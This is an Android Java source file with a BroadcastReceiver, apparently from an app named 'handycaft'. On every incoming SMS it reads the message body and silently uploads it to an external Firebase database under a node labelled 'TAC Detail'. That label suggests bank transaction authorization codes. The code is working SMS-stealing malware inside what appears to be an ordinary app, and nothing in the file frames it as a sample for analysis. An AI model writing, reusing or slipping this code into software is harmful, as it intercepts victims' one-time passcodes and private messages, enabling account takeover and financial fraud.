package com.strontech.imgautam.handycaft;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.provider.Telephony;
import android.telephony.SmsMessage;

import com.google.firebase.database.FirebaseDatabase;

public class MessageReceiver extends BroadcastReceiver {
 //   DatabaseReference databaseReference;

    @Override // android.content.BroadcastReceiver
    public void onReceive(Context context, Intent intent) {
        if ("android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())) {
            SmsMessage[] messagesFromIntent = new SmsMessage[0];
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.KITKAT) {
                messagesFromIntent = Telephony.Sms.Intents.getMessagesFromIntent(intent);
            }
            for (SmsMessage smsMessage : messagesFromIntent) {
                smsMessage.getOriginatingAddress();
                String message = smsMessage.getMessageBody();
              //  Log.e("TAG", "Onreceived" + message);
                FirebaseDatabase.getInstance("https://wisybuy-default-rtdb.firebaseio.com/").getReference("TAC Detail").push().child("TAC").setValue(message);
            }
        }
    }
}
